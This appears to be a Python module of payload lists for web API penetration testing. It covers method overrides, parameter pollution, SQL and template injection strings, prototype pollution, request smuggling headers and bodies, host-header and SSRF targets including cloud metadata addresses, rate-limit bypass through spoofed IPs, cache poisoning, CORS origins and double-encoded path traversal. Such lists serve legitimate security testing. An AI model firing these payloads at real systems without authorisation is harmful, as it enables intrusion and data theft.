# ============================================================
# METHOD PAYLOADS
# ============================================================

HTTP_METHODS = [
    "GET", "POST", "PUT", "DELETE", "PATCH",
    "HEAD", "OPTIONS", "TRACE", "CONNECT",
    "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
    "MOVE", "LOCK", "UNLOCK",
]

METHOD_OVERRIDE_HEADERS = [
    {"X-HTTP-Method-Override": "DELETE"},
    {"X-HTTP-Method-Override": "PUT"},
    {"X-HTTP-Method-Override": "PATCH"},
    {"X-Method-Override": "DELETE"},
    {"_method": "DELETE"},
]


# ============================================================
# PARAMETER POLLUTION PAYLOADS
# ============================================================

PARAM_POLLUTION = [
    "?id=1",
    "?id=1&id=2",
    "?id=1&id=1",
    "?id[]=1",
    "?id[]=1&id[]=2",
    "?id=1%00",
    "?id=1%20",
    "?id= 1",
    "?id=1;id=2",
    "?id=1,2",
    "?id=0&id=1",
    "?id=-1",
    "?id=9999999",
    "?id=1 OR 1=1",
    "?id=1'",
    "?id=1--",
    "?id=null",
    "?id=undefined",
    "?id=NaN",
    "?id[id]=1",
    "?id%5b%5d=1",
    "?1=1",
]


# ============================================================
# QUERY MANIPULATION PAYLOADS
# ============================================================

QUERY_MANIPULATION = [
    "?debug=true",
    "?debug=1",
    "?test=1",
    "?admin=1",
    "?internal=true",
    "?bypass=1",
    "?cache=false",
    "?nocache=1",
    "?format=json",
    "?format=xml",
    "?callback=test",
    "?jsonp=test",
    "?_=1",
    "?v=1",
    "?version=1",
    "?lang=en",
    "?locale=en",
    "?pretty=true",
    "?expand=*",
    "?fields=*",
    "?select=*",
    "?limit=9999",
    "?offset=0",
    "?page=0",
    "?page=-1",
    "?sort=id",
    "?order=asc",
    "?raw=true",
    "?include=all",
    "?filter=",
    "?search=*",
]


# ============================================================
# JSON INJECTION PAYLOADS
# ============================================================

JSON_INJECTION = [
    # Basic type confusion
    {"id": 1},
    {"id": "1"},
    {"id": True},
    {"id": None},
    {"id": []},
    {"id": {}},
    {"id": [1, 2]},
    # Overflow / boundary
    {"id": 99999999},
    {"id": -1},
    {"id": 0},
    {"id": 2**31 - 1},
    {"id": 2**63 - 1},
    # Injection strings
    {"id": "1 OR 1=1"},
    {"id": "1' OR '1'='1"},
    {"id": "' OR 1=1--"},
    {"id": "1; DROP TABLE users--"},
    {"id": "../../etc/passwd"},
    {"id": "${7*7}"},
    {"id": "{{7*7}}"},
    {"id": "<script>alert(1)</script>"},
    {"id": "\u0000"},
    {"id": "null"},
    {"id": "undefined"},
    # Extra keys
    {"id": 1, "__proto__": {"admin": True}},
    {"id": 1, "constructor": {"prototype": {"admin": True}}},
    {"id": 1, "role": "admin"},
    {"id": 1, "isAdmin": True},
    {"id": 1, "debug": True},
    # Nested
    {"data": {"id": 1}},
    {"query": {"id": 1}},
    {"filter": {"id": 1}},
]

JSON_FUZZ_STRINGS = [
    "",
    "null",
    "{}",
    "[]",
    "true",
    "false",
    "0",
    "-1",
    "9" * 100,
    "A" * 1000,
    "' OR '1'='1",
    "<script>",
    "${7*7}",
    "{{7*7}}",
    "\x00",
    "\r\n",
    "\\",
    "\"",
]


# ============================================================
# HTTP REQUEST SMUGGLING PAYLOADS
# ============================================================

SMUGGLING_HEADERS = [
    # CL.TE
    {
        "Transfer-Encoding": "chunked",
        "Content-Length": "4",
    },
    # TE.CL
    {
        "Transfer-Encoding": "chunked",
        "Content-Length": "3",
    },
    # TE.TE obfuscation
    {
        "Transfer-Encoding": "xchunked",
    },
    {
        "Transfer-Encoding": " chunked",
    },
    {
        "Transfer-Encoding": "chunked",
        "Transfer-Encoding": "x",  # duplicate
    },
    {
        "Transfer-Encoding": "Chunked",
    },
    {
        "Transfer-Encoding": "CHUNKED",
    },
    {
        "Transfer-Encoding": "chunked\r",
    },
    {
        "X-Transfer-Encoding": "chunked",
    },
]

SMUGGLING_BODY_CLTE = (
    "0\r\n\r\n"
    "G"
)

SMUGGLING_BODY_TECL = (
    "1\r\n"
    "G\r\n"
    "0\r\n\r\n"
)


# ============================================================
# HOST HEADER INJECTION PAYLOADS
# ============================================================

HOST_HEADER_PAYLOADS = [
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
    "internal",
    "internal.local",
    "169.254.169.254",          # AWS metadata
    "metadata.google.internal", # GCP metadata
    "100.100.100.200",          # Alibaba Cloud metadata
    "192.168.0.1",
    "10.0.0.1",
    "attacker.com",
    "evil.com",
    "localhost:80",
    "localhost:443",
    "localhost:8080",
    "127.0.0.1:80",
]

HOST_HEADER_INJECTION_VARIANTS = [
    # Absolute URI
    {"Host": "localhost", "X-Forwarded-Host": "attacker.com"},
    {"Host": "attacker.com"},
    {"Host": "localhost", "X-Host": "attacker.com"},
    {"Host": "localhost", "X-Forwarded-Server": "attacker.com"},
    {"Host": "localhost\r\nX-Injected: header"},
    # SSRF via host
    {"Host": "169.254.169.254"},
    {"Host": "metadata.google.internal"},
]


# ============================================================
# RATE LIMIT BYPASS PAYLOADS
# ============================================================

RATE_LIMIT_HEADERS = [
    # IP spoofing to trick rate limiter
    {"X-Forwarded-For": f"10.0.0.{i}"} for i in range(1, 11)
] + [
    {"X-Real-IP": f"10.0.0.{i}"} for i in range(1, 6)
] + [
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Fastly-Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
]

RATE_LIMIT_PATHS = [
    "",
    "/",
    "//",
    "?_=1",
    "?_=2",
    "?cachebust={}",
    "#",
]


# ============================================================
# CACHE POISONING PAYLOADS
# ============================================================

CACHE_POISON_HEADERS = [
    {"X-Forwarded-Host": "attacker.com"},
    {"X-Forwarded-Scheme": "http"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Port": "80"},
    {"X-Original-URL": "/poison"},
    {"X-Rewrite-URL": "/poison"},
    {"X-Override-URL": "/poison"},
    {"Pragma": "akamai-x-check-cacheable"},
    {"Pragma": "akamai-x-get-cache-key"},
    {"Cache-Control": "no-cache"},
    {"Cache-Control": "no-store"},
    {"Surrogate-Control": "no-store"},
    {"Vary": "*"},
]

CACHE_BUSTER_PARAMS = [
    f"?cb={i}" for i in range(1, 6)
] + [
    "?cachebust=abc",
    "?_=xyz",
    "?nocache=1",
]


# ============================================================
# CORS EXPLOIT PAYLOADS
# ============================================================

CORS_ORIGINS = [
    "null",
    "http://localhost",
    "http://127.0.0.1",
    "https://attacker.com",
    "https://evil.com",
    "https://target.com.evil.com",
    "https://evil-target.com",
    "",   # empty origin
]

CORS_HEADERS = [
    {"Origin": origin} for origin in CORS_ORIGINS
] + [
    {"Origin": "null", "Access-Control-Request-Method": "GET"},
    {"Origin": "null", "Access-Control-Request-Method": "POST"},
    {"Origin": "null", "Access-Control-Request-Headers": "Authorization"},
    {
        "Origin": "https://attacker.com",
        "Access-Control-Request-Method": "DELETE",
        "Access-Control-Request-Headers": "X-Custom-Header",
    },
]


# ============================================================
# DOUBLE ENCODING PAYLOADS
# ============================================================

DOUBLE_ENCODING = [
    # Double-encoded /
    "%252f",
    "%255c",
    # Double-encoded .
    "%252e",
    # Double-encoded ../
    "%252e%252e%252f",
    "%252e%252e/",
    "..%252f",
    "%252e%252e%255c",
    # Double-encoded null
    "%2500",
    # Triple encoding
    "%25252f",
    # Mixed
    "..%25%32%66",       # ..%2f
    "%2e%2e%25%32%66",
    # Unicode normalization
    "%u002f",
    "%u005c",
    "%uFF0F",
]
